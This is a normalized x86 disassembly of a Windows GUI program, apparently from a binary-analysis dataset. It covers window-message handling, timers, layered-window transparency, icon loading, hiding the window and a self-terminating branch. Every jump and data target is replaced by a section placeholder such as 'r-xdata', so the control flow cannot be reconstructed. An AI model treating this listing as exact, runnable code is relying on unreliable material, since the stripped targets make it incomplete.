mov [ esp + 0x2c ] 0x0
call sub_406050
mov [ esp + 0x2c ] 0xffffffff
cmp [ esp + 0x20 ] 0x8
jb r-xdata
xor edx edx
push 0xb
mov eax r--data
mov ecx edi
mov [ esp + 0x24 ] 0x7
mov [ esp + 0x20 ] 0x0
mov [ esp + 0x10 ] dx
call sub_429170
mov ecx [ esp + 0x24 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
add esp 0x28
retn
mov ecx [ esp + 0xc ]
push ecx
call sub_43f960
add esp 0x4
sub_406050
sub esp 0x210
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x20c ] eax
push ebx
push ebp
push esi
push edi
xor eax eax
push 0x206
mov esi ecx
push eax
lea ecx [ esp + 0x1e ]
mov edi edx
push ecx
mov [ esp + 0x1c ] edi
or ebx 0xffffffff
mov [ esp + 0x20 ] ax
call sub_443360
add esp 0xc
push 0x104
lea edx [ esp + 0x18 ]
push edx
mov eax esi
call sub_428aa0
push eax
call [ ExpandEnvironmentStringsW@IAT ]
mov ebp eax
test ebp ebp
je r-xdata
mov eax ebx
cmp ebp 0x104
jb r-xdata
lea eax [ esp + 0x14 ]
lea edx [ eax + 0x2 ]
xor ecx ecx
lea ebx [ ebp + 0x1 ]
mov eax ebx
mov edx 0x2
mul edx
seto cl
push rw-data
neg ecx
or ecx eax
push ecx
call sub_440cc4
mov edi eax
add esp 0x8
test edi edi
je r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea eax [ esp + 0x18 ]
mov esi edi
call sub_429cc0
xor eax eax
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
lea eax [ ebp + ebp + 0x2 ]
push eax
push 0x0
push edi
call sub_443360
add esp 0xc
push ebx
push edi
mov eax esi
call sub_428aa0
push eax
call [ ExpandEnvironmentStringsW@IAT ]
mov eax edi
lea edx [ eax + 0x2 ]
mov ecx [ esp + 0x21c ]
pop edi
pop esi
pop ebp
pop ebx
xor ecx esp
call sub_43f96b
add esp 0x210
retn
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
mov esi [ esp + 0x10 ]
sub eax edx
sar eax 0x1
push eax
mov eax edi
call sub_429cc0
push edi
xor esi esi
call sub_43f97a
add esp 0x4
mov eax esi
jmp r-xdata
sub_406180
push 0xffffffff
push sub_4594b8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x18 ]
mov [ fs : 0x0 ] eax
mov esi ecx
cmp [ esi + 0x74 ] 0x0
je r-xdata
xor al al
mov ecx [ esp + 0x18 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
add esp 0x14
retn 0x4
mov [ esp + 0x10 ] 0x0
push ecx
mov [ esp + 0x24 ] 0x0
mov ebx esp
mov [ esp + 0x18 ] esp
call sub_402ad0
mov eax [ esp + 0x2c ]
mov edx [ esi + 0x74 ]
push eax
lea ecx [ esp + 0x1c ]
call sub_402ca0
mov ebx eax
lea edi [ esp + 0x10 ]
call sub_402c40
mov esi [ esp + 0x14 ]
test esi esi
je r-xdata
mov esi [ esp + 0x10 ]
test esi esi
je r-xdata
lea ecx [ esi + 0x8 ]
push ecx
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
lea edi [ esp + 0x10 ]
call sub_402bf0
mov eax [ esi ]
test eax eax
je r-xdata
test esi esi
je r-xdata
push eax
call [ SysStringLen@IAT ]
test eax eax
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
mov esi [ esi ]
push esi
call sub_441113
add esp 0x4
test eax eax
lea edi [ esp + 0x10 ]
setne bl
call sub_402bf0
mov al bl
mov ecx [ esp + 0x18 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
add esp 0x14
retn 0x4
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push eax
call [ SysFreeString@IAT ]
push esi
call sub_43f960
add esp 0x4
push eax
call sub_43f97a
add esp 0x4
sub_4062d0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0xc
cmp [ ebp + 0x1c ] 0x0
push ebx
push esi
mov esi ecx
push edi
mov [ esp + 0x14 ] esi
jne r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn 0x18
mov eax [ ebp + 0xc ]
mov ebx [ ebp + 0x10 ]
cmp eax 0x113
jne r-xdata
cmp eax 0x200
jne r-xdata
lea eax [ esp + 0x10 ]
push eax
mov eax ebx
mov [ esp + 0x14 ] 0x1
call sub_409270
cmp [ esp + 0x10 ] 0x0
mov edi [ ebp + 0x18 ]
mov [ edi ] eax
je r-xdata
mov edi [ ebp + 0x18 ]
lea edi [ esp + 0x10 ]
mov [ esp + 0x10 ] 0x1
call sub_406eb0
cmp [ esp + 0x10 ] 0x0
mov ecx [ ebp + 0x18 ]
mov [ ecx ] eax
jne r-xdata
mov ecx [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
push edi
push ebx
lea edx [ esi + 0x24 ]
push edx
mov edx [ ebp + 0xc ]
call sub_4279f0
test eax eax
jne r-xdata
mov eax 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
mov eax [ ebp + 0xc ]
cmp eax 0x1
jne r-xdata
cmp eax 0x201
jne r-xdata
mov ecx esi
call sub_406f20
mov [ edi ] eax
mov eax 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
cmp eax 0x10
jne r-xdata
mov eax [ esi + 0x4 ]
push eax
call [ IsZoomed@IAT ]
test eax eax
jne r-xdata
cmp eax 0x40a
jne r-xdata
mov edx [ esi + 0x4 ]
push 0x388
push edx
call [ KillTimer@IAT ]
push 0x0
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
mov [ edi ] 0x0
mov eax 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
mov [ edi ] 0x0
mov eax 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
mov ecx [ esi + 0x4 ]
push eax
push 0xf012
push 0x112
push ecx
call [ SendMessageW@IAT ]
cmp eax 0x5
jne r-xdata
mov ecx esi
call sub_4078a0
mov [ edi ] eax
mov eax 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
cmp eax 0x2a3
jne r-xdata
cmp ebx 0x1
je r-xdata
cmp eax 0x113
jne r-xdata
cmp [ esi + 0xe3c ] 0x0
je r-xdata
mov eax 0x1
mov [ edi ] eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
mov eax [ ebp + 0x14 ]
push esi
call sub_408db0
mov [ edi ] eax
mov eax 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
cmp eax 0x111
jne r-xdata
mov ecx [ esi + 0x18 ]
mov [ ecx + 0x20 ] 0x1
push ebx
mov ecx esi
call sub_407580
mov [ edi ] 0x0
mov edx [ esi + 0x18 ]
cmp [ edx + 0x20 ] 0x0
je r-xdata
mov [ edi ] 0x0
mov eax 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
mov eax [ esi + 0x4 ]
push 0x0
push 0x32
push 0x386
push eax
call [ SetTimer@IAT ]
call [ GetTickCount@IAT ]
mov [ esi + 0xe44 ] eax
cmp eax 0x52c
je r-xdata
mov eax 0x3e9
cmp ax bx
jne r-xdata
push r--data
call [ RegisterWindowMessageW@IAT ]
cmp [ ebp + 0xc ] eax
jne r-xdata
mov eax 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
mov [ edi ] 0x1
mov eax 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
cmp eax 0x52e
jne r-xdata
mov eax 0x3ea
cmp ax bx
je r-xdata
mov ecx ebx
shr ecx 0x10
xor edx edx
cmp dx cx
jne r-xdata
mov esi [ ebp + 0x14 ]
mov eax [ ebp + 0xc ]
lea ecx [ esp + 0x10 ]
push ecx
mov ecx [ esp + 0x18 ]
mov [ esp + 0x14 ] 0x1
call sub_426d80
cmp [ esp + 0x10 ] 0x0
mov [ edi ] eax
jne r-xdata
mov ecx esi
call sub_408fd0
mov [ edi ] eax
mov eax 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
cmp eax 0x52f
jne r-xdata
push esi
mov ecx ebx
call sub_409a10
mov [ edi ] eax
mov eax 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
mov eax 0x3eb
cmp ax bx
je r-xdata
cmp eax 0x530
jne r-xdata
push esi
call sub_409090
mov [ edi ] eax
mov eax 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
mov eax 0x3ec
cmp ax bx
jne r-xdata
cmp eax 0x532
jne r-xdata
push esi
call sub_4092c0
mov [ edi ] eax
mov eax 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
mov eax 0x3ed
cmp ax bx
jne r-xdata
mov ecx ebx
shr ecx 0x10
xor edx edx
cmp dx cx
jne r-xdata
cmp eax 0x534
jne r-xdata
mov eax esi
call sub_408e70
mov [ edi ] eax
mov eax 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
mov eax 0x3ee
cmp ax bx
jne r-xdata
mov ecx ebx
shr ecx 0x10
xor edx edx
cmp dx cx
jne r-xdata
call sub_407f60
mov [ edi ] eax
mov eax 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
push ebx
mov ebx esi
call sub_408ec0
mov [ edi ] eax
mov eax 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
mov eax 0x3ef
cmp ax bx
jne r-xdata
mov ecx ebx
shr ecx 0x10
xor edx edx
cmp dx cx
jne r-xdata
call sub_408040
mov [ edi ] eax
mov eax 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
mov eax 0x3f2
cmp ax bx
jne r-xdata
mov ecx ebx
shr ecx 0x10
xor edx edx
cmp dx cx
jne r-xdata
mov ebx esi
call sub_4088f0
mov [ edi ] eax
mov eax 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
mov eax 0x3f3
cmp ax bx
jne r-xdata
mov ecx ebx
shr ecx 0x10
xor edx edx
cmp dx cx
jne r-xdata
push esi
call sub_408c10
mov [ edi ] eax
mov eax 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
mov eax 0x3f0
cmp ax bx
jne r-xdata
mov ecx ebx
shr ecx 0x10
xor edx edx
cmp dx cx
jne r-xdata
mov eax esi
call sub_4089d0
mov [ edi ] eax
mov eax 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
mov ecx ebx
shr ecx 0x10
xor edx edx
cmp dx cx
jne r-xdata
push esi
call sub_4089f0
mov [ edi ] eax
mov eax 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
mov eax [ esi + 0x4 ]
push edx
push edx
push 0x10
push eax
call [ PostMessageW@IAT ]
mov [ edi ] 0x1
mov eax 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
sub_406780
push 0xffffffff
push sub_45b4a3
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x24 ]
mov [ fs : 0x0 ] eax
mov edi [ esp + 0x34 ]
mov eax [ DefWindowProcW@IAT ]
xor ebx ebx
mov [ edi + 0x4 ] ebx
mov [ edi + 0x14 ] ebx
mov [ edi + 0x18 ] ebx
mov [ edi + 0x1c ] ebx
mov [ edi + 0x20 ] eax
lea ecx [ edi + 0x28 ]
push ecx
mov [ esp + 0x30 ] ebx
call sub_4235c0
mov [ edi + 0x24 ] r--data
mov [ edi + 0x7c ] ebx
mov [ edi + 0x80 ] ebx
mov [ edi + 0x84 ] ebx
mov ebp 0x1
mov [ edi + 0x70 ] ebp
mov [ edi + 0x74 ] ebp
mov [ edi + 0x78 ] ebx
mov [ edi + 0x88 ] ebx
mov [ edi + 0x8c ] ebx
mov eax [ edi + 0x7c ]
cmp eax ebx
je r-xdata
mov [ edi + 0x80 ] ebx
mov [ edi + 0x84 ] ebx
lea esi [ edi + 0x170 ]
push esi
lea edx [ edi + 0x90 ]
mov [ esp + 0x30 ] 0x1
push edx
mov [ edi ] r--data
mov [ edi + 0x24 ] r--data
call sub_402d70
push esi
mov [ esp + 0x30 ] 0x2
call sub_40f4f0
lea eax [ edi + 0x18c ]
push eax
mov [ esp + 0x30 ] 0x3
call sub_40da70
lea ecx [ edi + 0x514 ]
push ecx
mov [ esp + 0x30 ] 0x4
call sub_40de90
lea edx [ edi + 0x910 ]
push edx
mov [ esp + 0x30 ] 0x5
call sub_40e2e0
mov [ esp + 0x2c ] 0x6
mov [ edi + 0xd00 ] ebx
mov [ edi + 0xd04 ] ebx
mov [ edi + 0xd08 ] ebx
mov [ edi + 0xd0c ] ebx
mov [ edi + 0xd10 ] ebx
mov [ edi + 0xd14 ] ebx
lea eax [ edi + 0xd2c ]
push eax
mov [ edi + 0xd18 ] ebx
mov [ edi + 0xd1c ] ebx
mov [ edi + 0xd20 ] ebx
mov [ edi + 0xcfc ] r--data
mov [ edi + 0xd24 ] ebx
mov [ edi + 0xd28 ] ebx
call sub_422b50
mov [ esp + 0x2c ] 0x7
mov [ edi + 0xd84 ] ebx
mov [ edi + 0xd88 ] ebx
mov [ edi + 0xd8c ] ebx
mov [ edi + 0xd90 ] ebx
mov [ edi + 0xd94 ] ebx
mov [ edi + 0xd98 ] ebx
mov [ edi + 0xd9c ] ebx
mov [ edi + 0xda0 ] ebx
mov [ edi + 0xda4 ] ebx
mov [ edi + 0xdb4 ] ebx
mov [ edi + 0xdac ] ebx
mov eax r--data
mov [ edi + 0xd80 ] eax
mov [ edi + 0xdbc ] ebx
mov [ edi + 0xdc0 ] ebx
mov [ edi + 0xdc4 ] ebx
mov [ edi + 0xdc8 ] ebx
mov [ edi + 0xdcc ] ebx
mov [ edi + 0xdd0 ] ebx
mov [ edi + 0xdd4 ] ebx
mov [ edi + 0xdd8 ] ebx
mov [ edi + 0xddc ] ebx
mov [ edi + 0xdb8 ] eax
mov [ edi + 0xdec ] ebx
mov [ edi + 0xde4 ] ebx
mov [ edi + 0xdf4 ] ebx
mov [ edi + 0xdf8 ] ebx
mov [ edi + 0xdfc ] ebx
mov [ edi + 0xe00 ] ebx
mov [ edi + 0xe04 ] ebx
mov [ edi + 0xe08 ] ebx
mov [ edi + 0xe0c ] ebx
mov [ edi + 0xdf0 ] eax
mov [ edi + 0xe10 ] ebx
mov [ edi + 0xe14 ] ebx
mov [ edi + 0xe24 ] ebx
mov [ edi + 0xe1c ] ebx
lea eax [ edi + 0xe4c ]
push eax
mov [ edi + 0xe28 ] bl
mov [ edi + 0xe29 ] bl
mov [ edi + 0xe2a ] bl
mov [ edi + 0xe30 ] 0x6
mov [ edi + 0xe34 ] ebx
mov [ edi + 0xe38 ] ebx
mov [ edi + 0xe3c ] bl
mov [ edi + 0xe48 ] 0x1
mov [ edi + 0xe49 ] 0x1
call sub_424d40
mov [ esp + 0x2c ] 0x8
mov [ edi + 0xe6c ] ebp
lea ebp [ edi + 0xe70 ]
push ebp
call sub_40f4f0
lea esi [ edi + 0xe88 ]
mov [ esp + 0x2c ] 0x9
call sub_421ee0
mov [ edi + 0xe8c ] bl
mov [ edi + 0xe8d ] 0x1
mov [ edi + 0xe90 ] 0x927c0
mov [ edi + 0xe94 ] ebx
mov [ edi + 0xe98 ] ebx
mov [ edi + 0xe40 ] 0xcc
mov ecx [ rw-data ]
push 0xdc
push ecx
call [ LoadIconW@IAT ]
mov ecx [ ebp + 0xc ]
mov [ esp + 0x14 ] eax
cmp ecx ebx
jne r-xdata
push eax
call sub_44120e
add esp 0x4
mov [ edi + 0x7c ] ebx
mov eax [ ebp + 0x14 ]
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
cmp ecx esi
jbe r-xdata
mov eax [ esp + 0x14 ]
mov [ esi ] eax
add esi 0x4
mov [ ebp + 0x10 ] esi
jmp r-xdata
mov esi [ ebp + 0x10 ]
mov edx esi
sub edx ecx
sar edx 0x2
cmp edx eax
jae r-xdata
mov eax [ ebp ]
push esi
push eax
lea ecx [ esp + 0x1c ]
push ecx
lea edx [ esp + 0x24 ]
push edx
mov eax ebp
call sub_4104f0
call sub_4407b7
mov eax [ rw-data ]
push 0xdd
push eax
call [ LoadIconW@IAT ]
mov [ esp + 0x14 ] eax
mov eax [ ebp + 0xc ]
cmp eax ebx
jne r-xdata
mov ecx [ ebp + 0x14 ]
sub ecx eax
sar ecx 0x2
xor ecx ecx
jmp r-xdata
cmp eax esi
jbe r-xdata
mov eax [ esp + 0x14 ]
mov [ esi ] eax
add esi 0x4
mov [ ebp + 0x10 ] esi
jmp r-xdata
mov esi [ ebp + 0x10 ]
mov edx esi
sub edx eax
sar edx 0x2
cmp edx ecx
jae r-xdata
mov eax [ ebp ]
push esi
push eax
lea ecx [ esp + 0x1c ]
push ecx
lea edx [ esp + 0x24 ]
push edx
mov eax ebp
call sub_4104f0
call sub_4407b7
mov eax [ rw-data ]
push 0xdf
push eax
call [ LoadIconW@IAT ]
mov [ esp + 0x14 ] eax
mov eax [ ebp + 0xc ]
cmp eax ebx
jne r-xdata
mov ecx [ ebp + 0x14 ]
sub ecx eax
sar ecx 0x2
xor ecx ecx
jmp r-xdata
cmp eax esi
jbe r-xdata
mov eax [ esp + 0x14 ]
mov [ esi ] eax
add esi 0x4
mov [ ebp + 0x10 ] esi
jmp r-xdata
mov esi [ ebp + 0x10 ]
mov edx esi
sub edx eax
sar edx 0x2
cmp edx ecx
jae r-xdata
mov eax [ ebp ]
push esi
push eax
lea ecx [ esp + 0x1c ]
push ecx
lea edx [ esp + 0x24 ]
push edx
mov eax ebp
call sub_4104f0
call sub_4407b7
mov eax [ rw-data ]
push 0xe0
push eax
call [ LoadIconW@IAT ]
mov [ esp + 0x14 ] eax
mov eax [ ebp + 0xc ]
cmp eax ebx
jne r-xdata
mov ecx [ ebp + 0x14 ]
sub ecx eax
sar ecx 0x2
xor ecx ecx
jmp r-xdata
cmp eax esi
jbe r-xdata
mov eax [ esp + 0x14 ]
mov [ esi ] eax
add esi 0x4
mov [ ebp + 0x10 ] esi
jmp r-xdata
mov esi [ ebp + 0x10 ]
mov edx esi
sub edx eax
sar edx 0x2
cmp edx ecx
jae r-xdata
mov eax [ ebp ]
push esi
push eax
lea ecx [ esp + 0x1c ]
push ecx
lea edx [ esp + 0x24 ]
push edx
mov eax ebp
call sub_4104f0
call sub_4407b7
mov eax [ rw-data ]
push 0xe1
push eax
call [ LoadIconW@IAT ]
mov [ esp + 0x14 ] eax
mov eax [ ebp + 0xc ]
cmp eax ebx
jne r-xdata
mov ecx [ ebp + 0x14 ]
sub ecx eax
sar ecx 0x2
xor ecx ecx
jmp r-xdata
cmp eax esi
jbe r-xdata
mov eax [ esp + 0x14 ]
mov [ esi ] eax
add esi 0x4
mov [ ebp + 0x10 ] esi
jmp r-xdata
mov esi [ ebp + 0x10 ]
mov edx esi
sub edx eax
sar edx 0x2
cmp edx ecx
jae r-xdata
mov eax [ ebp ]
push esi
push eax
lea ecx [ esp + 0x1c ]
push ecx
lea edx [ esp + 0x24 ]
push edx
mov eax ebp
call sub_4104f0
call sub_4407b7
mov eax [ rw-data ]
push 0xe2
push eax
call [ LoadIconW@IAT ]
mov [ esp + 0x14 ] eax
mov eax [ ebp + 0xc ]
cmp eax ebx
jne r-xdata
mov ecx [ ebp + 0x14 ]
sub ecx eax
sar ecx 0x2
xor ecx ecx
jmp r-xdata
cmp eax esi
jbe r-xdata
mov eax [ esp + 0x14 ]
mov [ esi ] eax
add esi 0x4
mov [ ebp + 0x10 ] esi
jmp r-xdata
mov esi [ ebp + 0x10 ]
mov edx esi
sub edx eax
sar edx 0x2
cmp edx ecx
jae r-xdata
mov eax [ ebp ]
push esi
push eax
lea ecx [ esp + 0x1c ]
push ecx
lea edx [ esp + 0x24 ]
push edx
mov eax ebp
call sub_4104f0
call sub_4407b7
mov eax [ rw-data ]
push 0xe3
push eax
call [ LoadIconW@IAT ]
mov [ esp + 0x14 ] eax
mov eax [ ebp + 0xc ]
cmp eax ebx
jne r-xdata
mov ecx [ ebp + 0x14 ]
sub ecx eax
sar ecx 0x2
xor ecx ecx
jmp r-xdata
cmp eax esi
jbe r-xdata
mov eax [ esp + 0x14 ]
mov [ esi ] eax
add esi 0x4
mov [ ebp + 0x10 ] esi
jmp r-xdata
mov esi [ ebp + 0x10 ]
mov edx esi
sub edx eax
sar edx 0x2
cmp edx ecx
jae r-xdata
mov eax [ ebp ]
push esi
push eax
lea ecx [ esp + 0x1c ]
push ecx
lea edx [ esp + 0x24 ]
push edx
mov eax ebp
call sub_4104f0
call sub_4407b7
mov eax [ rw-data ]
push 0xe4
push eax
call [ LoadIconW@IAT ]
mov [ esp + 0x14 ] eax
mov eax [ ebp + 0xc ]
cmp eax ebx
jne r-xdata
mov ecx [ ebp + 0x14 ]
sub ecx eax
sar ecx 0x2
xor ecx ecx
jmp r-xdata
cmp eax esi
jbe r-xdata
mov eax [ esp + 0x14 ]
mov [ esi ] eax
add esi 0x4
mov [ ebp + 0x10 ] esi
jmp r-xdata
mov esi [ ebp + 0x10 ]
mov edx esi
sub edx eax
sar edx 0x2
cmp edx ecx
jae r-xdata
mov eax [ ebp ]
push esi
push eax
lea ecx [ esp + 0x1c ]
push ecx
lea edx [ esp + 0x24 ]
push edx
mov eax ebp
call sub_4104f0
call sub_4407b7
mov eax [ rw-data ]
push 0xe5
push eax
call [ LoadIconW@IAT ]
mov [ esp + 0x14 ] eax
mov eax [ ebp + 0xc ]
cmp eax ebx
jne r-xdata
mov ecx [ ebp + 0x14 ]
sub ecx eax
sar ecx 0x2
xor ecx ecx
jmp r-xdata
cmp eax esi
jbe r-xdata
mov eax [ esp + 0x14 ]
mov [ esi ] eax
add esi 0x4
mov [ ebp + 0x10 ] esi
jmp r-xdata
mov esi [ ebp + 0x10 ]
mov edx esi
sub edx eax
sar edx 0x2
cmp edx ecx
jae r-xdata
mov eax [ ebp ]
push esi
push eax
lea ecx [ esp + 0x1c ]
push ecx
lea edx [ esp + 0x24 ]
push edx
mov eax ebp
call sub_4104f0
call sub_4407b7
mov eax [ rw-data ]
push 0xe6
push eax
call [ LoadIconW@IAT ]
mov ecx [ ebp + 0xc ]
mov [ esp + 0x14 ] eax
cmp ecx ebx
je r-xdata
mov esi [ ebp + 0x10 ]
mov edx esi
sub edx ecx
sar edx 0x2
cmp edx ebx
jae r-xdata
mov ebx [ ebp + 0x14 ]
sub ebx ecx
sar ebx 0x2
cmp ecx esi
jbe r-xdata
mov [ esi ] eax
add esi 0x4
mov [ ebp + 0x10 ] esi
jmp r-xdata
mov eax [ ebp ]
push esi
push eax
lea eax [ esp + 0x1c ]
push eax
lea ecx [ esp + 0x24 ]
push ecx
mov eax ebp
call sub_4104f0
call sub_4407b7
mov eax edi
mov ecx [ esp + 0x24 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1c
retn 0x4
sub_406e50
sub esp 0x8
test al al
jne r-xdata
movzx eax al
mov [ esp ] eax
fild [ esp ]
fld [ r--data ]
jmp r-xdata
fnstcw [ esp ]
push 0x3
movzx eax [ esp + 0x4 ]
or eax 0xc00
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x10 ]
fldcw [ esp + 0x8 ]
fistp [ esp + 0x8 ]
mov cl [ esp + 0x8 ]
movzx edx cl
mov ecx [ eax + 0x4 ]
fldcw [ esp + 0x4 ]
push edx
push 0x0
push ecx
call [ SetLayeredWindowAttributes@IAT ]
add esp 0x8
retn 0x4
sub_406eb0
mov eax [ esi + 0x4 ]
sub esp 0x14
push 0x386
push eax
call [ KillTimer@IAT ]
mov [ esi + 0xe40 ] 0xcc
mov al [ esi + 0xe40 ]
push esi
call sub_406e50
xor eax eax
cmp [ esi + 0xe3c ] al
je r-xdata
mov [ edi ] 0x0
add esp 0x14
retn
mov ecx [ esi + 0x4 ]
lea edx [ esp ]
mov [ esp + 0x4 ] eax
mov [ esp + 0x8 ] eax
push edx
mov [ esp + 0x10 ] eax
mov [ esp + 0x4 ] 0x10
mov [ esp + 0x8 ] 0x2
mov [ esp + 0xc ] ecx
call [ TrackMouseEvent@IAT ]
xor eax eax
sub_406f20
push 0xffffffff
push sub_45b047
mov eax [ fs : 0x0 ]
push eax
sub esp 0x114
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x110 ] eax
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x128 ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov eax [ esi + 0x4 ]
lea ebp [ esi + 0x4 ]
push r--data
push eax
call [ SetWindowTextW@IAT ]
push 0xea
push r--data
call [ GetModuleHandleW@IAT ]
push eax
call [ LoadIconW@IAT ]
mov edi eax
mov eax [ ebp ]
push edi
push 0x1
push 0x80
push eax
call [ SendMessageW@IAT ]
mov eax [ ebp ]
push edi
xor ebx ebx
push ebx
push 0x80
push eax
call [ SendMessageW@IAT ]
xor ecx ecx
mov [ esp + 0x120 ] 0x7
mov [ esp + 0x11c ] ebx
mov [ esp + 0x10c ] cx
mov [ esp + 0x130 ] ebx
push r--data
lea edi [ esp + 0x10c ]
mov [ esi + 0xe2c ] ebx
call sub_421d30
mov eax [ esp + 0x120 ]
add esp 0x4
push r--data
lea edi [ ebx + 0x4 ]
lea ecx [ esp + 0x10c ]
call sub_4298e0
test eax eax
jne r-xdata
xor edx edx
mov [ esp + 0xb0 ] 0x7
mov [ esp + 0xac ] ebx
mov [ esp + 0x9c ] dx
push r--data
lea edi [ esp + 0x9c ]
mov [ esp + 0x134 ] 0x1
call sub_421d30
mov eax [ esp + 0xb0 ]
add esp 0x4
push r--data
mov edi 0x4
lea ecx [ esp + 0x9c ]
call sub_4298e0
test eax eax
jne r-xdata
inc [ esi + 0xe2c ]
mov [ esi + 0xe28 ] 0x1
xor eax eax
mov [ esp + 0x94 ] 0x7
mov [ esp + 0x90 ] ebx
mov [ esp + 0x80 ] ax
push r--data
lea edi [ esp + 0x80 ]
mov [ esp + 0x134 ] 0x2
call sub_421d30
mov eax [ esp + 0x94 ]
add esp 0x4
push r--data
mov edi 0x4
lea ecx [ esp + 0x80 ]
call sub_4298e0
test eax eax
jne r-xdata
inc [ esi + 0xe2c ]
mov [ esi + 0xe29 ] 0x1
cmp [ esi + 0xe28 ] bl
jne r-xdata
inc [ esi + 0xe2c ]
mov [ esi + 0xe2a ] 0x1
xor edx edx
mov [ esp + 0x14 ] 0x2bf20
mov [ esp + 0xcc ] 0x7
mov [ esp + 0xc8 ] ebx
mov [ esp + 0xb8 ] dx
push r--data
lea edi [ esp + 0xb8 ]
mov [ esp + 0x134 ] 0x3
call sub_421d30
mov eax [ esp + 0xcc ]
add esp 0x4
push r--data
mov edi 0x2
lea ecx [ esp + 0xb8 ]
call sub_4298e0
test eax eax
jne r-xdata
cmp [ esi + 0xe29 ] bl
jne r-xdata
xor eax eax
mov [ esp + 0x78 ] 0x7
mov [ esp + 0x74 ] ebx
mov [ esp + 0x64 ] ax
push r--data
lea edi [ esp + 0x64 ]
mov [ esp + 0x134 ] 0x4
call sub_421d30
mov eax [ esp + 0x78 ]
add esp 0x4
push r--data
mov edi 0x4
lea ecx [ esp + 0x64 ]
call sub_4298e0
test eax eax
jne r-xdata
mov [ esp + 0x14 ] 0x3e8
cmp [ esi + 0xe2a ] bl
jne r-xdata
xor ecx ecx
mov [ esp + 0xe8 ] 0x7
mov [ esp + 0xe4 ] ebx
mov [ esp + 0xd4 ] cx
push r--data
lea edi [ esp + 0xd4 ]
mov [ esp + 0x134 ] 0x5
call sub_421d30
mov eax [ esp + 0xe8 ]
add esp 0x4
push r--data
mov edi 0x5
lea ecx [ esp + 0xd4 ]
call sub_4298e0
test eax eax
jne r-xdata
mov [ esi + 0xe8c ] 0x1
mov ecx [ ebp ]
push ebx
push ebx
push 0x10
push ecx
call [ PostMessageW@IAT ]
xor edx edx
mov [ esp + 0x40 ] 0x7
mov [ esp + 0x3c ] ebx
mov [ esp + 0x2c ] dx
push r--data
lea edi [ esp + 0x2c ]
mov [ esp + 0x134 ] 0x6
call sub_421d30
add esp 0x4
cmp [ esp + 0x3c ] ebx
je r-xdata
mov [ esi + 0xe8d ] bl
mov eax [ ebp ]
push ebx
push eax
call [ ShowWindow@IAT ]
xor ecx ecx
mov [ esp + 0x5c ] 0x7
mov [ esp + 0x58 ] ebx
mov [ esp + 0x48 ] cx
push r--data
lea edi [ esp + 0x48 ]
mov [ esp + 0x134 ] 0x7
call sub_421d30
mov eax [ esp + 0x4c ]
add esp 0x4
cmp [ esp + 0x5c ] 0x8
jae r-xdata
cmp [ esp + 0x40 ] 0x8
mov eax [ esp + 0x2c ]
jae r-xdata
push r--data
push eax
call [ lstrcmpiW@IAT ]
test eax eax
jne r-xdata
lea eax [ esp + 0x48 ]
push eax
call sub_441113
add esp 0x4
mov [ esi + 0xe90 ] eax
lea eax [ esp + 0x2c ]
mov [ esi + 0xe98 ] ebx
call sub_42e190
mov [ eax + 0x10 ] 0x14
call sub_42e190
mov ecx [ esp + 0x14 ]
mov [ eax + 0xc ] ecx
call sub_42e190
mov [ eax + 0x14 ] 0x50
call sub_42e190
mov ecx [ ebp ]
mov edi eax
